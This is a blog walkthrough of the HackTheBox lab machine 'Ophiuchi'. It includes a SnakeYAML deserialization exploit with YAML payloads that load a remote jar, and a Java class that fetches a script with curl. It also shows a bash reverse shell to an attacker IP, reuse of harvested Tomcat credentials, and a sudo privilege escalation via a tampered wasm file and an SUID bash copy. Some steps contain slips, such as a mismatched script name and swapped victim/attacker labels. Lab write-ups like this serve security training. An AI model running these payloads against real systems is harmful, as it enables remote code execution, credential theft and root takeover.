---
title: Ophiuchi HackTheBox Machine Writeup and Walkthrough
author: Gaurav Raj
date: 2021-05-17 15:04:00 +0800
categories: [CTF, HackTheBox]
tags: [ctf, hackthebox, htb, writeup, walkthrough, java, jar, jre, snakeyaml, apache tomcat, wasm, wat]
---


## Ophiuchi
> HackTheBox Medium Level Machine

## Target IP
```
export IP=10.10.10.227
```

## Nmap Scan
```
# Nmap 7.91 scan initiated Mon May 17 06:17:08 2021 as: nmap -sC -sV -A -v -oN nmap/initial 10.10.10.227
Nmap scan report for 10.10.10.227
Host is up (0.19s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 6d:fc:68:e2:da:5e:80:df:bc:d0:45:f5:29:db:04:ee (RSA)
|   256 7a:c9:83:7e:13:cb:c3:f9:59:1e:53:21:ab:19:76:ab (ECDSA)
|_  256 17:6b:c3:a8:fc:5d:36:08:a1:40:89:d2:f4:0a:c6:46 (ED25519)
8080/tcp open  http    Apache Tomcat 9.0.38
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Parse YAML
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon May 17 06:17:37 2021 -- 1 IP address (1 host up) scanned in 29.05 seconds
```

## HTTP Enumeration
Here's the first look of the default site on port `8080` which is utilizing `Apache Tomcat` which uses `java` in the backend.
![](/assets/ophiuchi/images/Pasted image 20210517121733.png)

after entering a valid YAML data, the application says that 'the feature is disabled due to security reasons.', so tried to break the application and entered wrong YAML data and got `500 Internal Server Error` error
![](/assets/ophiuchi/images/Pasted image 20210517121943.png)

### Finding Exploit
and we got some useful information that the application is utilizing `snakeyaml`, so let's check if we have any known exploits or vulnerability. looks like we do have a `RCE` in `Snakeyaml`. read [more](https://swapneildash.medium.com/snakeyaml-deserilization-exploited-b4a2c5ac0858).

### PoC
For testing this exploit, started a Python HTTP server on port `80` and then used this payload.
![](/assets/ophiuchi/images/Pasted image 20210517123048.png)
and here we got the hit on our server.
![](/assets/ophiuchi/images/Pasted image 20210517123153.png)

#### Payload
```yaml
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://10.10.14.35/"]
  )
]
```

#### Python HTTP Server
```bash
[elliot@archlinux]  ophiuchi git:(main) ✗ sudo python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.227 - - [17/May/2021 12:28:39] code 404, message File not found
10.10.10.227 - - [17/May/2021 12:28:39] "HEAD /META-INF/services/javax.script.ScriptEngineFactory HTTP/1.1" 404 -
```

## Gaining Access

we found a payload for this vulnerability on github, get it [here](https://github.com/artsploit/yaml-payload)

from this we can get code execution, so now we will create a `shell.sh` file which will be executed by the `shell.jar` file and we will have our shell.
So git clone the repository and then make some changes to the main `.java` file in here `yaml-payload/src/artsploit/AwesomeScriptEngineFactory.java`, here's the changes

```java
package artsploit;

import javax.script.ScriptEngine;
import javax.script.ScriptEngineFactory;
import java.io.IOException;
import java.util.List;

public class AwesomeScriptEngineFactory implements ScriptEngineFactory {

    public AwesomeScriptEngineFactory() {
        try {
            Runtime.getRuntime().exec("curl http://10.10.14.35/shell.sh -O /tmp/shell.sh");
            Runtime.getRuntime().exec("bash /tmp/revshell.sh");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
```

and here's the `shell.sh` script
```bash
#!/bin/bash
bash -c 'bash -i >& /dev/tcp/10.10.14.35/4444 0>&1'
```

now compressing the `.java` file to the `java` package \(`.jar`\).
```bash
vagrant@ubuntu-xenial:~/tools/yaml-payload$ javac src/artsploit/AwesomeScriptEngineFactory.java
vagrant@ubuntu-xenial:~/tools/yaml-payload$ jar -cvf shell.jar -C src/ .
added manifest
adding: artsploit/(in = 0) (out= 0)(stored 0%)
adding: artsploit/AwesomeScriptEngineFactory.java(in = 1570) (out= 416)(deflated 73%)
adding: artsploit/AwesomeScriptEngineFactory.class(in = 1679) (out= 705)(deflated 58%)
ignoring entry META-INF/
adding: META-INF/services/(in = 0) (out= 0)(stored 0%)
adding: META-INF/services/javax.script.ScriptEngineFactory(in = 36) (out= 38)(deflated -5%)
```

**NOTE:** Make sure that your `jdk` version is equal or older than version 11.

now create python http server and here's payload to get the code execution, make sure to start the listner before submitting the payload to `yaml` field.
```yaml
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://10.10.14.35/shell.jar"]
  )
]
```

and here we got the shell and we are in the system.

### User Flag
while enumerating the machine got the credentials of the `admin` user inside the configuration file of `Apache Tomcat` here `/opt/tomcat/conf/tomcat-users.xsd`
```html
<user username="admin" password="xxxxxxxxxxxxxxxx" roles="manager-gui,admin-gui"/>
```

and now we are user `admin`, so here's the user flag.

#### Flag
```bash
xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```

## Privilege Escalation

### Enumeration
and here we go our user can run `index.go` as root user.
```bash
admin@ophiuchi:~$ sudo -l
Matching Defaults entries for admin on ophiuchi:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User admin may run the following commands on ophiuchi:
    (ALL) NOPASSWD: /usr/bin/go run /opt/wasm-functions/index.go
```

let's cat out the `index.go` file see what we have.
```go
package main

import (
        "fmt"
        wasm "github.com/wasmerio/wasmer-go/wasmer"
        "os/exec"
        "log"
)


func main() {
        bytes, _ := wasm.ReadBytes("main.wasm")

        instance, _ := wasm.NewInstance(bytes)
        defer instance.Close()
        init := instance.Exports["info"]
        result,_ := init()
        f := result.String()
        if (f != "1") {
                fmt.Println("Not ready to deploy")
        } else {
                fmt.Println("Ready to deploy")
                out, err := exec.Command("/bin/sh", "deploy.sh").Output()
                if err != nil {
                        log.Fatal(err)
                }
                fmt.Println(string(out))
        }
- }
```

So according to the script if the result of `main.wasm` will be `1` then a script named `deploy.sh` will run, and `main.wasm` and `deploy.sh` file is used by relative path, we can modify the original `main.wasm` file to always return `1` as result and create our own `deploy.sh` to get root access, enough planning let's do it.

### Crafting the Payload

first copy the file on our attacker machine
```bash
mkdir -p /tmp/privesc && cd /tmp/privesc
cp /opt/wasm-functions/main.wasm
nc 10.10.14.35 4444 < main.wasm 	(victim machine)
nc -nvlp 444 > main.wasm 	(attacker machine)
```

since `main.wasm` is a compiled `web assembly` binary file we can't edit it directly, first we have to convert it into `.wat` file then we will modify it to return `1` and we will again convert this into `.wasm` binary.

**Converting wasm to wat**
```
wasm2wat main.wasm > main.wat
```

here's the `main.wat` file
```bash
(module
  (type (;0;) (func (result i32)))
  (func $info (type 0) (result i32)
    i32.const 0)
  (table (;0;) 1 1 funcref)
  (memory (;0;) 16)
  (global (;0;) (mut i32) (i32.const 1048576))
  (global (;1;) i32 (i32.const 1048576))
  (global (;2;) i32 (i32.const 1048576))
  (export "memory" (memory 0))
  (export "info" (func $info))
  (export "__data_end" (global 1))
  (export "__heap_base" (global 2)))
```

as we can see from the above code that `result i32` is a constant variable `i32.const 0` which will alwasy return `0`, so let's change it to `1`

change `i32.const 0` to `i32.const 1` and then recompile the binary file.

```bash
wat2wasm main.wasm
```

now transferring the `main.wasm` file on the victim machine.
```bash
python3 -m http.server 		(victim machine)
curl http://10.10.14.35:8000/main.wasm -o main.wasm 	(attacker machine)
```

now here the our `deploy.sh` script
```bash
#!/bin/sh

cp /bin/bash /home/admin/.rootshell
chmod +s /home/admin/.rootshell
ls -al /home/admin/.rootshell
```

everyting is ready now, let's run the `index.go` as root

```bash
admin@ophiuchi:/tmp/privesc$ sudo /usr/bin/go run /opt/wasm-functions/index.go
Ready to deploy
uid=0(root) gid=0(root) groups=0(root)
-rwsr-sr-x 1 root root 1183448 May 17 08:47 /home/admin/.rootshell
```

### Root Flag
Now we have a copy of `/bin/bash` binary as `.rootshell` with `SUID` bit set, let's be root now :)
```bash
admin@ophiuchi:/tmp/work$ /home/admin/.rootshell -p
.rootshell-5.0# /bin/bash
.rootshell-5.0# cat /root/root.txt
xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
.rootshell-5.0#
```

#### Flag
```bash
xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```

And here we completed the machine, So that's it for now, Hope I'll see you again
Don't forget to share if you liked it...